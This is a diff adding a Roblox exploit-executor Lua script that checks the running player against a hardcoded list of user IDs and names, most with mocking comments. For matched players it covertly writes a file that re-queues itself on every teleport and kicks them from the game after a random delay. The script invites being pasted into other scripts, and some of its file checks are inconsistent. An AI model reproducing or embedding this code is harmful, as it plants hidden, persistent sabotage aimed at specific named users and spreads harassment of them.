@@ -1,0 +1,113 @@
+-- get genv so it passes through scripts
+-- i am the moral soldier i am so moral i have to control other peoples morals
+getgenv().detected = false
+if isfile("ScriptBlox/iloveyou") then
+    detected = true
+end
+getgenv().loopleave = true
+getgenv().skids = {
+    [5591589763] = "Babfurr",
+    [1887945280] = "MARK_YUXD",
+    [7972531842] = "4d4_a", --no no hat rig no no scripts 
+    [10984879485] = "epic0_dude4", -- being involved
+    -- bad gooners no no ^^^^
+    [11085677322] = "shipa_593",
+    [11240583602] = "Revolutionphoton",
+    --[11133382678] = "tacobellchickachu123" -- remove this in the final cut
+    [11664491757] = "uzaiknight_official",
+    [11592153979] = "C178304",
+    [10317322855] = "Thaeeiei121123",
+    [9397318102] = "realrs01",
+    [11626512898] = "OsmanliDevleti5",
+    [10966457493] = "Haz16532",
+    [10840364737] = "whoisyoudude_5",
+    [10910316173] = "givehi87",
+    [8926632438] = "notfaraz7",
+    [11564505248] = "Internal_injector", -- he has a stupid name
+    [8770175643] = "loshok_30089r2akkoff", -- skidding other peoples hat rigs
+    [11055078772] = "docteroxy",
+    [4399517139] = "adenikop",
+    [11735914292] = "boxing_crab5", -- tried to fling me
+    [11295653847] = "Sonish3105", -- named something stupid like mullvad
+    [10922743045] = "SpeedMa354", -- he's a bacon
+    [10086017956] = "Hagen992", -- discolored noob loser
+    [11745714168] = "baconthehacker701",
+    [11819606446] = "fafsfsfafgs", -- loser tried to server but got rate limited
+    [11819143750] = "yoyoyoooisurboy",
+    [11728688304] = "flyshoot76",
+    [11809721664] = "raffa_script",
+    [11780709160] = "chico1600734",
+    [11635674389] = "vibemen0",
+    [5074173670] = "Grigori904",
+    [8605634693] = "Ishaqpro014",
+    [11819681577] = "thebestkinggg4",
+    [11830378215] = "ccccf3328",
+    [11797952098] = "CgBenLover6967152",
+    [11821912732] = "cyrutsgvhjbaz",
+    [11027539317] = "booood_67",
+    [8770175643] = "loshok_30089r2akkoff",
+    [11328499525] = "ghetrobloxvng99999",
+}
+local display = game.Players.LocalPlayer.DisplayName
+local function displey(name)
+    if name == display then
+        return true
+    else
+        return false
+    end
+end
+-- example code or you can just go ahead and paste it i dont care
+for userid, name in getgenv().skids do
+    if game.Players.LocalPlayer.UserId == userid then
+        --warn("boi u sussy")
+        getgenv().detected = true
+        --return
+    end
+    if game.Players.LocalPlayer.Name == name then
+        --print("boi u sussy")
+        getgenv().detected = true
+        --return
+    end
+end
+getgenv().SkidNames = {
+    "tubers93",
+    "Tubers93",
+    "Hacker",
+    "ST4R",
+    "C00lKidd",
+    "coolkidd",
+    "c00lkidd",
+    "Invincible",
+    "fat",
+}
+for _, v in getgenv().SkidNames do
+    if v == display and not getgenv().detected then
+        getgenv().detected = true
+    end
+end
+if not detected then 
+    print("boi you not sussy")
+else
+    warn("you are sussy")
+    if isfile("ScriptBlox/ok.lua") then
+        print(readfile("ScriptBlox/ok.lua"))
+    end
+end
+local source = [=[
+local e = readfile("ScriptBlox/ok.lua")
+queue_on_teleport(e)
+local waiting = math.random(5,500)
+wait(0.2)
+print(waiting)
+task.wait(waiting)
+game.ExperienceService:LeaveExperienceWithReason()
+]=]
+if detected and not isfile("ScriptBlox/iloveyou") then
+    writefile("ScriptBlox/iloveyou.txt","you are tatsuki")
+    writefile("ScriptBlox/ok.lua",source)
+end
+local no = readfile("ScriptBlox/ok.lua")
+if isfile("ScriptBlox/ok.lua") and loopleave then
+    queue_on_teleport(no)
+end
+makefolder("ScriptBlox")
